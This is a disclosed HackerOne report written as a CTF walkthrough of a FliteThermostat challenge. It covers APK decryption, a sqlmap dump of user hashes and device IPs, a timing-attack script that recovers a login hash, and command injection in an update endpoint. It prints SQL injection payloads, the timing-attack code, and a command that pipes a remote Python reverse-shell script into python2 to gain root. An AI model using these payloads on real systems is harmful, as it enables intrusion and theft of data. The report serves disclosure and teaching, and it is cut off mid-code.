{"id":509080,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDkwODA=","url":"https://hackerone.com/reports/509080","title":"LFI on Accounting server and RCE on FliteThermostat admin server","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-03-13T05:38:26.951Z","submitted_at":"2019-03-13T05:38:26.951Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"stong","url":"/stong","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/308/492/483bbf842beb55bc2377d05e2085b606b3266dd4_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:56:21.938Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:56:14.541Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nAn attacker is able to download local files on the Accounting server due leveraging improper input sanitization in the Invoice PDF generator. In the same fashion an attacker is also able to issue server-side requests on the Accounting server through user-controlled CSS, possibly leading to further exploitation.\n\nAn attacker is able to execute remote code on the FliteThermostat admin control panel's server due to a command injection vulnerability. Said control panel's authentication can be broken using a timing attack. Lastly, an attacker is able to read the contents of the thermostat database due to a SQL injection vulnerability.\n\n## Steps To Reproduce:\nMany of my friends are deep into web security, but this is my first time really getting my toes wet :D\nI did well on h1-702-ctf last year, so I wanted to try it again this year!\nI will be detailing the process I took using a \"CTF-style\" writeup, which is probably more verbose than a usual bug-bounty writeups. Hopefully though, it will more clearly explain the thought process and intuition I followed. Plus, this is a \"CTF\" right?\n\n### (0x00) Baby Steps.\nI found out about this challenge from my friend Jazzy, who linked me [this tweet](https://twitter.com/Hacker0x01/status/1100543680383832065). To be honest, I actually didn't realize that the challenge began with the image embedded with the tweet until I did more recon and found [Cody Brocious's Twitter](https://twitter.com/daeken/status/1100634878490656768). Then it was clear that we were supposed to look for data hidden in the image.\n\nClearly there's some binary text in the background. The first thing I noticed was that the data was regular, because of the equal spacing between the underscores in the image. The text wrapping leads to the formation of a linear pattern artifact.\n\n{F440492}\n\nSince each chunk seems to be the same, thankfully we only need to transcribe one reptition of this pattern, not the whole image. Transcribing this, we get the data:\n\n```\n7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6 D2 D7 4F  zlib+xœË())(¶Ò×O\nCA 2C D1 4B C9 D7 CF 30 2C C9 48 2D CA 05 00 5B  Ê,ÑKÉ×Ï0,ÉH-Ê..[\n4F 07 F4 7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6  O.ôzlib+xœË())(¶\n```\n\nThe data announces that it's zlib compressed, but we can also tell from the `78 9C` magic at offset 5. We cut off the first five bytes and decompress:\n\n```\n$ echo \"78 9C CB 28 29 29 28 B6 D2 D7 4F CA 2C D1 4B C9 D7 CF 30 2C C9 48 2D CA 05 00 5B 4F 07 F4 7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6\" | xxd -r -p | openssl zlib -d; echo\nhttps://bit.do/h1therm\n```\n\nCool! So we have a URL to work with now. I also looked for LSB stego, which is typical for this type of challenge.\n\n{F440489}\n\nThere is regular data in the LSB of the red, green, and blue planes. Extracting this, we see the same data as earlier.\n\n{F440490}\n\n### (0x01) h1therm\n\nThe url from earlier is a shortened URL which leads to a [grdive link](https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view) of an APK, h1thermostat.apk. Okay, so looks like we will need to do some managed-code reversing. APK's are essentially zip files, so let's take a peek inside.\n\n```\n$ unzip -l h1thermostat.apk\nArchive:  h1thermostat.apk\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n     3188  1980-00-00 00:00   AndroidManifest.xml\n       87  1980-00-00 00:00   META-INF/MANIFEST.MF\n      ...\n  3012436  1980-00-00 00:00   classes.dex\n      ...\n    15132  1980-00-00 00:00   res/mipmap-xxxhdpi-v4/ic_launcher_round.png\n   333076  1980-00-00 00:00   resources.arsc\n---------                     -------\n  4835993                     568 files\n```\n\nLooks like we are dealing with a .dex file, which we will need to decompile to .class files to decompile.\nLuckily there is a good tool for this, dex2jar. \n\n```\n$ dex-tools-2.1-SNAPSHOT\\d2j-dex2jar.bat classes.dex\ndex2jar classes.dex -\u003e ./classes-dex2jar.jar\n$ jda classes-dex2jar.jar\n```\n\nNow let's analyze this binary. My preferred tool for Java reversing is JDA, which helpfully displays decompiled output side-by-side with Bytecode or an intermediate representation. Looking through a list of strings, we see `ttp://35.243.186.41/`, `username`, `password`, `cmd`, and `getTemp`. Judging from this, I bet we're dealing with a login API. So, let's just try POSTing to it and see what happens.\n\n```\n$ curl -X POST http://35.243.186.41/\nD7x4a8mJ/xcxoiH0vPNa6bhXAs/4rCXTORPrJK9wSPzD32NZRiZTgIWq0kjqQpLsUd87ao2/zlkoDu9PfAjs2g==\n$ curl -X POST http://35.243.186.41/ | base64 -d | xxd\n00000000: d2a9 88d7 ae25 4a73 2c5d d4af 36bf 2bc9  .....%Js,]..6.+.\n00000010: 8bdc 4e7f 539b cade d8e1 d18d 1e1b ccb4  ..N.S...........\n00000020: 5ef7 82ff 39b3 9ae4 d261 5a41 b09e 0ec8  ^...9....aZA....\n00000030: 5a1b 3fe4 368a 65c1 b3fe 4669 1092 1c36  Z.?.6.e...Fi...6\n```\n\nUmm...okay. This is high-entropy data. I guess we need to read the source code. The last four strings, `username`, `password`, `cmd`, and `getTemp`, are used in the clas LoginActivity, which simply builds a payload from the login form. The payload is a JSON object that looks like `{\"username\": \"admin\", \"password\": \"1234\", \"cmd\": \"getTemp\"}`. The PayloadRequest class actually performs the request, so we will analyze this class in greater detail.\n\n```java\npublic class PayloadRequest extends Request {\n    private final Listener mListener;\n    private final HashMap mParams;\n\n    public PayloadRequest(JSONObject var1, final Listener var2) throws Exception {\n        super(1, \"http://35.243.186.41/\", new ErrorListener() {\n            public void onErrorResponse(VolleyError var1) {\n                var2.onResponse(\"Connection failed\");\n            }\n        });\n        this.mListener = var2;\n        this.mParams = new HashMap();\n        this.mParams.put(\"d\", this.buildPayload(var1));\n    }\n\n    private String buildPayload(JSONObject var1) throws Exception {\n        SecretKeySpec var2 = new SecretKeySpec(new byte[]{56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116}, \"AES\");\n        byte[] var3 = new byte[16];\n        (new SecureRandom()).nextBytes(var3);\n        IvParameterSpec var4 = new IvParameterSpec(var3);\n        Cipher var5 = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        var5.init(1, var2, var4);\n        byte[] var6 = var5.doFinal(var1.toString().getBytes());\n        byte[] var7 = new byte[var6.length + 16];\n        System.arraycopy(var3, 0, var7, 0, 16);\n        System.arraycopy(var6, 0, var7, 16, var6.length);\n        return Base64.encodeToString(var7, 0);\n    }\n\n    protected Response parseNetworkResponse(NetworkResponse var1) {\n        try {\n            String var2 = new String(var1.data);\n            byte[] var3 = Base64.decode(var2, 0);\n            byte[] var9 = new byte[16];\n            System.arraycopy(var3, 0, var9, 0, 16);\n            byte[] var6 = new byte[var3.length - 16];\n            System.arraycopy(var3, 16, var6, 0, var3.length - 16);\n            SecretKeySpec var11 = new SecretKeySpec(new byte[]{56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116}, \"AES\");\n            IvParameterSpec var4 = new IvParameterSpec(var9);\n            Cipher var10 = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n            var10.init(2, var11, var4);\n            var9 = var10.doFinal(var6);\n            String var7 = new String(var9);\n            JSONObject var12 = new JSONObject(var7);\n            if (var12.getBoolean(\"success\")) {\n                return Response.success((Object)null, this.getCacheEntry());\n            } else {\n                Response var8 = Response.success(var12.getString(\"error\"), this.getCacheEntry());\n                return var8;\n            }\n        } catch (Exception var5) {\n            return Response.success(\"Unknown\", this.getCacheEntry());\n        }\n    }\n}\n\n```\n\nJust as we expected, this class does cryptography with a hardcoded key on the request and response bodies. It encrypts the payload and encodes it as base64, passing it as the parameter `d`. Let's quickly implement this behavior into a transparent reverse proxy so we can actually access the endpoint and play with it (Twisted FTW).\n\n```python\nfrom twisted.internet import reactor\nfrom twisted.web import proxy, server\nfrom twisted.web.resource import EncodingResourceWrapper, Resource\nfrom io import BytesIO as StringIO\n\nfrom urllib import urlencode\nfrom base64 import b64decode, b64encode\nimport json\nfrom Crypto.Cipher import AES\n\n# https://stackoverflow.com/questions/12562021/aes-decryption-padding-with-pkcs5-python\nBS = 16\npad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) \nunpad = lambda s : s[0:-ord(s[-1])]\n\nclass AESCipher:\n    def __init__( self, key ):\n        self.key = key.decode(\"hex\")\n\n    def encrypt( self, raw ):\n        raw = pad(raw)\n        iv = 'A' * 16\n        cipher = AES.new( self.key, AES.MODE_CBC, iv )\n        return iv + cipher.encrypt( raw )\n\n    def decrypt( self, enc ):\n        iv  = enc[:16]\n        enc = enc[16:]\n        cipher = AES.new(self.key, AES.MODE_CBC, iv )\n        return unpad(cipher.decrypt( enc))\n\nclass CryptEncoderFactory(object):\n    cipher = AESCipher('384f2e6a1a05e5223b80e960a0a65074')\n\n    def encoderForRequest(self, request):\n        payload = json.dumps({k:v[0] for k,v in request.args.items()})\n        print payload\n        encoded_payload = urlencode({'d': b64encode(self.cipher.encrypt(payload))})\n        print encoded_payload\n        request.content = StringIO(encoded_payload)\n        request.requestHeaders.removeHeader('content-length')\n        request.requestHeaders.setRawHeaders('content-length', [str(len(encoded_payload))])\n        return CryptEncoder(request, self.cipher)\n\nclass CryptEncoder(object):\n    def __init__(self, request, cipher):\n        self.request = request\n        self.cipher = cipher\n\n    def encode(self, data):\n        print data\n        try:\n            decrypted = self.cipher.decrypt(b64decode(data))\n            self.request.responseHeaders.removeHeader('content-length')\n            self.request.responseHeaders.setRawHeaders('content-length', [str(len(decrypted))])\n            print decrypted\n            return decrypted\n        except Exception as e:\n            print 'Failed to decrypt response:',e\n            return data\n\n    def finish(self):\n        return ''\n\nclass EncoderFactoryFactory(object):\n    def __init__(self, encoders):\n        self.encoders = encoders\n\n    def wrap(self, wrapped):\n        class CryptingReverseProxy(proxy.ReverseProxyResource, object):\n            def __init__(wrapped_self, backend):\n                super(CryptingReverseProxy, wrapped_self).__init__(backend.host, backend.port, backend.path, backend.reactor)\n            \n            def getChild(wrapped_self, path, request):\n                return self.wrap(super(CryptingReverseProxy, wrapped_self).getChild(path, request))\n\n        return EncodingResourceWrapper(CryptingReverseProxy(wrapped), self.encoders)\n\nbackend = proxy.ReverseProxyResource('35.243.186.41', 80, '')\nwrapper = EncoderFactoryFactory([CryptEncoderFactory()])\nsite = server.Site(wrapper.wrap(backend))\nreactor.listenTCP(8001, site)\nreactor.run()\n```\n\nThe implementation is not very clean, but it is very fast. Anyways let's test our endpoint!\n\n```\n$ curl \"http://localhost:8001\" -X POST --data \"username=admin\u0026password=lol123\u0026cmd=getTemp\"\n\"success\": false, \"error\": \"Invalid username or password\"}\n$ curl \"http://localhost:8001\" -X POST --data \"username=admin\u0026password=password\u0026cmd=getTemp\"\n{\"temperature\": 73, \"success\": true}\n$ curl \"http://localhost:8001\" -X POST --data \"username=admin\u0026password=password\u0026cmd=getTempp\"\n{\"success\": false, \"error\": \"Unknown command\"}\n$ curl \"http://localhost:8001\" -X POST --data \"username=admin\u0026password=password\u0026cmd=setTemp\"\n{\"success\": false, \"error\": \"Missing temperature\"}\n$ curl \"http://localhost:8001\" -X POST --data \"username=admin\u0026password=password\u0026cmd=setTemp\u0026temp=50\"\n{\"success\": true}\n```\n\nLOL nice password. Let's check for SQL injection.\n\n```\n$ python sqlmap.py -u \"http://localhost:8001\" --method=POST --data=\"username=admin\u0026password=admin\u0026cmd=setTemp\u0026temp=50\" --level 5 --risk 3\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.3.2.31#dev}\n|_ -| . [']     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 23:24:00 /2019-03-12/\n\n[23:24:18] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable\n[23:24:40] [INFO] POST parameter 'username' appears to be 'MySQL \u003e= 5.0.12 AND time-based blind' injectable\n[23:24:19] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]\nPOST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N]\nsqlmap identified the following injection point(s) with a total of 772 HTTP(s) requests:\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: username=admin' AND 6107=(SELECT (CASE WHEN (6107=6107) THEN 6107 ELSE (SELECT 4219 UNION SELECT 9192) END))-- ZaDb\u0026password=admin\u0026cmd=setTemp\u0026temp=50\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind\n    Payload: username=admin' AND SLEEP(5)-- rYre\u0026password=admin\u0026cmd=setTemp\u0026temp=50\n---\n[23:25:11] [INFO] the back-end DBMS is MySQL\nweb application technology: Nginx 1.15.8\nback-end DBMS: MySQL \u003e= 5.0.12\n[23:25:11] [INFO] fetched data logged to text files under '/root/.sqlmap/output/localhost'\n\n[*] ending @ 23:25:11 /2019-03-12/\n```\n\nNice. Let's dump everything!\n\n```\n$ python sqlmap.py -u \"http://localhost:8001\" --method=POST --data=\"username=admin\u0026password=admin\u0026cmd=setTemp\u0026temp=50\" --dump --threads 5\nDatabase: flitebackend\nTable: users\n[2 entries]\n+----+----------+---------------------------------------------+\n| id | username | password                                    |\n+----+----------+---------------------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |\n| 2  | sevenate | c5b1d550b588178c4bb321069fb688ab (nine10)   |\n+----+----------+---------------------------------------------+\n\nDatabase: flitebackend\nTable: devices\n[151 entries]\n+-----+-----------------+\n| id  | ip              |\n+-----+-----------------+\n| 1   | 251.11.33.68    |\n| 2   | 10.143.156.45   |\n       --- snip ---\n| 150 | 192.88.99.145   |\n| 151 | 192.88.99.104   |\n+-----+-----------------+\n```\n\nNotice the weak hashes. We also see a table `devices` which apparently is just a list of IP addresses.\nHowever, looking at the list the majority of them seem to be either in private ranges or not routed.\nTo clean up this list, I used a nmap ping scan.\n\n```\n$ stdbuf -oL nmap -sn -vvv -iL hosts.txt | tee scan.txt\nStarting Nmap 7.40 ( https://nmap.org ) at 2019-03-17 10:38 EST\nInitiating Ping Scan at 20:08\nScanning 104.196.12.98 [4 ports]\nCompleted Ping Scan at 20:08, 0.22s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 20:08\nCompleted Parallel DNS resolution of 1 host. at 20:08, 0.02s elapsed\nDNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 20:08\nScanning 98.12.196.104.bc.googleusercontent.com (104.196.12.98) [1 port]\nDiscovered open port 80/tcp on 104.196.12.98\nCompleted SYN Stealth Scan at 20:08, 0.22s elapsed (1 total ports)\nNmap scan report for 98.12.196.104.bc.googleusercontent.com (104.196.12.98)\nHost is up, received reset ttl 55 (0.038s latency).\nScanned at 2019-03-17 10:38:23 EST for 1s\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 55\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.57 seconds\n           Raw packets sent: 5 (196B) | Rcvd: 7 (542B)\n```\n\nReally? Only 1 host is up, and it has http server? This must be the path forwards.\n\n### (0x02) FliteThermostat, part I\n\nWe are first greeted by what appears to be a login page.\n\n{F440494}\n\nLooking at the webpage's source code, we see the bulk of the functionality is implemented in `login.js`:\n\n```javascript\nfunction stream(key) {\n\tthis.b = [];\n\tfor(var i = 0; i \u003c 256; ++i)\n\t\tthis.b[i] = i;\n\tvar j = 0;\n\tfor(var i = 0; i \u003c 256; ++i) {\n\t\tj = (j + this.b[i] + key.charCodeAt(i % key.length)) \u0026 0xFF;\n\t\tvar t = this.b[i];\n\t\tthis.b[i] = this.b[j];\n\t\tthis.b[j] = t;\n\t}\n\tthis.a = 0;\n\tthis.c = 0;\n}\n\nstream.prototype.next = function() {\n\tthis.a = (this.a + 1) \u0026 0xFF;\n\tthis.c = (this.c + this.b[this.a]) \u0026 0xFF;\n\tvar t = this.b[this.a];\n\tthis.b[this.a] = this.b[this.c];\n\tthis.b[this.c] = t;\n\treturn this.b[(this.b[this.a] + this.b[this.c]) \u0026 0xFF];\n};\n\nfunction e(x) {\n\tvar s = new stream(x);\n\tvar ox = '';\n\tfor(var i = 0; i \u003c x.length; ++i)\n\t\tox += String.fromCharCode(s.next() ^ x.charCodeAt(i));\n\treturn ox;\n}\n\nfunction hash(x) {\n\tx += '\\x01\\x00';\n\twhile((x.length \u0026 0xFF) != 0)\n\t\tx += String.fromCharCode((x.length \u0026 0xFF) ^ x.charCodeAt[x.length \u0026 0xFF]);\n\t\n\tvar h = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];\n\tfor(var i = 0; i \u003c x.length; i += 32) {\n\t\tvar c = e(x.substring(i, i + 32));\n\t\tfor(var j = 0; j \u003c 32; ++j)\n\t\t\th[j] ^= c.charCodeAt(j);\n\t}\n\n\tvar hs = '';\n\tfor(var i = 0; i \u003c 32; ++i)\n\t\ths += String.fromCharCode(h[i]);\n\treturn hs;\n}\n\nfunction fhash(x) {\n\tfor(var i = 0; i \u003c 256; ++i)\n\t\tx = hash(x);\n\tvar h = '';\n\tfor(var i = 0; i \u003c 32; ++i) {\n\t\tvar t = x.charCodeAt(i).toString(16);\n\t\tif(t.length == 1)\n\t\t\tt = '0' + t;\n\t\th += t;\n\t}\n\treturn h;\n}\n\nfunction login() {\n\tdocument.getElementById('hash').value = fhash(\n\t\tdocument.getElementById('username').value +\n\t\t'\\x05\\0\\x06' + \n\t\tdocument.getElementById('password').value\n\t);\n\tdocument.getElementById('form').submit();\n}\n```\n\nThis is a crappy hash function based on multiple rounds of the RC4 stream cipher, where the key is the input data. However, I could not find any obvious flaws that while playing with this function. Instead, let's play with the server and see if we can do anything interesting.\n\nAs before, I implemented another reverse proxy; however, this proved to not be useful as Sqlmap didn't find any vulnerabilities. Plus, why would there be 2 SQLi challenges in a row? Taking a step back, one particular thing that bothered me was that we were authenticating using a hash, rather than username and password credentials. Why bother sending a hash? And if it's only hashed client-side, that defeats the purpose of hashing anyways, since if the hashes are ever stolen, you can break into people's accounts.\n\nHere is the intuition I had: First, assume the application is exploitable. If the problem isn't SQLi, and it isn't cryptographic, then there must be some kind of logical weakness in the server's app. **IDEALLY, what would the server's code look like?** In my head, I pictured some pseudocode like this:\n\n```\nif hardcoded_hash == request.get_param('hash'):\n\tauthenticate()\nelse:\n\tfail()\n```\n\nIn that case, the weakness must lie in the comparison itself. Otherwise, the solution to this challenge would have to be something other than a vulnerability in the webapp's programming. First, I thought of the PHP type juggling comparison bug, where strings starting with \"0e\" would be coerced to floats, and lead to faulty comparisons. But checking the 404 page quickly dispelled that idea.\n\n{F440488}\n\nThis doesn't look like PHP. This looks like Flask. OK, then. How else could the comparison be weak? Can we leak information about the hardcoded_hash? I was out of any other ideas, so I tried doing a timing attack on the string comparison. This almost never works, but hey, it's a CTF right? :)\n\n```python\nfrom scipy import stats\nimport numpy\nimport socket,time\nimport random\nimport threading\n\ndef do_request(q_hash):\n\tassert len(q_hash) == 64\n\trequest_data = \"\"\"POST / HTTP/1.1\nHost: 104.196.12.98\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 69\n\nhash=\"\"\" + q_hash + '\\n'\n\t\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect((\"104.196.12.98\", 80))\n\tstart_time = time.time()\n\ts.send(request_data)\n\tresp = s.recv(1)\n\telapsed = time.time() - start_time\n\ts.shutdown(socket.SHUT_RDWR)\n\ts.close()\n\treturn elapsed\n\ndef generate_hash(prefix, val):\n\tq_hash = prefix + ('%02x' % val)\n\tq_hash += '00' * (32-len(q_hash)/2)\n\treturn q_hash\n\ndef do_sample(prefix, values):\n\tsample = []\n\tfor val in values:\n\t\ttime.sleep(0.1)\n\t\tq_hash = generate_hash(prefix, val)\n\t\telapsed = do_request(q_hash)\n\t\tsample.append(elapsed)\n\t\tprint q_hash, elapsed\n\t\t# if numpy.var(sample) \u003e 0.001:\n\t\t# \tprint 'This sample is garbage'\n\t\t# \tbreak\n\treturn sample\n\ndef stable_sample(prefix, values):\n\twhile True:\n\t\tsample = do_sample(prefix, values)\n\t\tmean = numpy.mean(sample)\n\t\tvar = numpy.var(sample)\n\t\tprint 'mu, sigma: ', mean, var\n\t\tif var \u003e 0.001:\n\t\t\tprint 'Sample variance too high. Try again.'\n\t\telse:\n\t\t\treturn sample\n\nnum_threads = 0\n\ndef test_val(pop_mean, prefix, val, cands):\n\tglobal num_threads\n\tprint '[*] Testing %02x' % (val,)\n\t# sample = stable_sample(prefix, [val] * 1)\n\tsample = do_sample(prefix, [val])[0]\n\tif sample - pop_mean \u003c 0.4:\n\t\tprint '[-] Boring (mean close to population)'\n\t\tprint\n\telse:\n\t\t# t, p = stats.ttest_ind(pop_sample, sample)\n\t\t# print 'p =', p\n\t\t# if p \u003c 0.001:\n\t\tprint '[+] This is a candidate!'\n\t\tcands.append(val)\n\t\t# else:\n\t\t\t# print '[-] Boring'\n\tnum_threads -= 1\n\ndef do_round(prefix, to_test):\n\tglobal num_threads\n\t# print '[*] Collecting a population sample'\n\t# pop_sample = stable_sample(prefix, [random.randint(0,255) for i in range(2)])\n\tpop_mean = 0.5 + len(prefix) / 4.0\n\tprint 'Expecting delay of %f seconds' % (pop_mean)\n\tprint\n\tcands = []\n\tfor val in to_test:\n\t\twhile num_threads \u003e= 20:\n\t\t\ttime.sleep(0.1)\n\t\tnew_thread = threading.Thread(target=test_val, args=(pop_mean, prefix, val, cands))\n\t\tnew_thread.daemon = True\n\t\tnew_thread.start()\n\t\tnum_threads += 1\n\t\tprint\n\t\ttime.sleep(1)\n\twhile num_threads \u003e 0:\n\t\ttime.sleep(0.1)\n\tprint '[*] Candidates:', cands\n\treturn cands\n\ndef hack():\n\tprefix = 'f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde7'\n\twhile len(prefix) \u003c 64:\n\t\tprint '[*] Round start:', prefix\n\t\tcands = range(0x00, 0xff)\n\t\twhile len(cands) \u003e 1:\n\t\t\tcands = do_round(prefix, cands)\n\t\t\tif not cands:\n\t\t\t\tprint 'Ran out of candidates!!'\n\t\t\t\treturn\n\t\tprefix += '%02x' % (cands[0],)\n\treturn prefix\n\nprint 'Result: ' + hack()\n\n# print ('%02x' % val), sum(samples)/len(samples), samples\n```\n\nIt's pretty obvious that the timing attack worked after I went through all the hashes from '00XXXXX...' to 'FFXXXXX...'. Any hash starting with 'f9' was noticably slower; the response time was delayed by about 0.5 seconds. Then I tried it for 'f900XXXX...' to 'f9FFXXXX', and 'f986' was delayed by about 1.0 seconds. I guess we are lucky that the remote server is very consistent with its delays. Unfortunately, the server's connection is really unstable so we often need multiple tries to make sure that we are sure whether a guess is correct or not.\n\nAfter a looooooooooooooooooooong time, we finally get the hash `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`, which we are able to log in with! It's kind of like a pass the hash attack, as we don't even need the plaintext credentials.\n\n### 0x03 FliteThermostat, part II\n\nI used Burp Suite to make the login request, then copied the cookies into Firefox. Now this screen greets us:\n\n{F440486}\n\nThe temperature control page wasn't really interesting. One interesting thing I noticed was that it only accepted valid numbers for its API parameter. But you could also use underscores in numbers (e.g. `12_345 = 12345`) which indicated that this was a Python3 Flask server.\n\nWhat piqued my interest was the Check For Updates page. If we could subvert the firmware update, we could get RCE then!\n\n{F440487}\n\nLet's see if we can control the host and port for this connection.\n\n```\nGET /update?port=1234\nConnecting to http://update.flitethermostat:1234/ and downloading update manifest\n```\n\nNice, that one was an easy guess. I tried playing with this parameter, but unfortunately it has to be a valid integer. :( The following parameter, on the other hand, was NOT an easy guess.\n\n```\nGET /update?port=1234\u0026update_host=perfect.blue\nConnecting to http://perfect.blue:1234/ and downloading update manifest\n```\n\nThis told me that this update checker doesn't actually work: I setup `nc -lvp 1234` on that host, but I didn't receive a connection. In that case, what could we do?\n\nUnlike before, this parameter isn't validated. So let's just try injecting some symbols to see if anything breaks.\n\n```\nGET /update?port=1234\u0026update_host=lol~!@#$%^\u0026*()_+-=[]\\{}|:%22;'%3C%3E?,./\nConnecting to http://lol~!@:1234/ and downloading update manifest\n```\n\nOK, looks like it cut off the input at `#`. I wonder if this is command injection?\n\n```\n/update?port=1234\u0026update_host=lol;echo a\nConnecting to http://lol and downloading update manifest\n...\n...\n...\nCould not connect\na:1234/\n```\n\n```\n/update?port=1234\u0026update_host=lol$PATH\nConnecting to http://lol/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:1234/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nYup...so my hypothesis is that the server probably does something like `exec(\"check_update http://\" + host \":\" + str(port)\")`. Let's upgrade this to a reverse shell and pop this box!\n\n```\nGET /update?port=12345\u0026update_host=x;curl%20https://raw.githubusercontent.com/perfectblue/attack-defense-tools/master/chippyshell.py%20|%20python2;echo%20\n\nOn server:\nroot@perfect.blue:~# socat file:`tty`,raw,echo=0 tcp-listen:6969\n  @@@@@@@ @@@  @@@ @@@ @@@@@@@  @@@@@@@  @@@ @@@  @@@ @@@@@@  @@@@@@  @@@@@@@\n !@@      @@!  @@@ @@! @@!  @@@ @@!  @@@ @@! !@@  @@@     @@!     @@!      @@!\n !@!      @!@!@!@! !!@ @!@@!@!  @!@@!@!   !@!@!   !@!  @!!!:   @!!!:      @!!\n :!!      !!:  !!! !!: !!:      !!:        !!:    !!!     !!:     !!:  .!!:\n  :: :: :  :   : : :    :        :         .:     :   ::: ::  ::: ::  : :\n             ~[  P R I V 8  C O N N E C T   B A C K   S H E L L  ]~\nLinux 834f8ab4b851 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux\nuid=0(root) gid=0(root) groups=0(root)\nroot@d090cd50ec64:~# ip addr\n1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n170: eth0@if171: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default \n    link/ether 02:42:ac:19:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.25.0.3/16 brd 172.25.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\nroot@d090cd50ec64:~# df -h /\b\nFilesystem      Size  Used Avail Use% Mounted on\noverlay         9.8G  3.2G  6.1G  35% /\ntmpfs            64M     0   64M   0% /dev\ntmpfs           7.4G     0  7.4G   0% /sys/fs/cgroup\n/dev/sda1       9.8G  3.2G  6.1G  35% /etc/hosts\nshm              64M     0   64M   0% /dev/shm\ntmpfs           7.4G     0  7.4G   0% /proc/acpi\ntmpfs           7.4G     0  7.4G   0% /sys/firmware\nroot@d090cd50ec64:~# ls\nDockerfile   login.js  requirements.txt  temptarget  uwsgi.ini\n__pycache__  main.py   templates\t update.sh\n```\n\nNice. A few things to note: based on `ip addr`, we're probably inside Docker. Also, that \"\"\"update checker\"\"\" was a total scam:\n\n```bash\n#!/bin/bash\n\necho \"Connecting to $* and downloading update manifest\"\necho \"...\"\necho \"...\"\necho \"...\"\necho \"Could not connect\"\n```\n\nAnd the earlier hypothesis about the timing attack was pretty close!\n\n```python\nvalidLogin = 'f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8'\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n\tif 'loggedIn' in session and session['loggedIn']:\n\t\treturn redirect('/main')\n\terror = 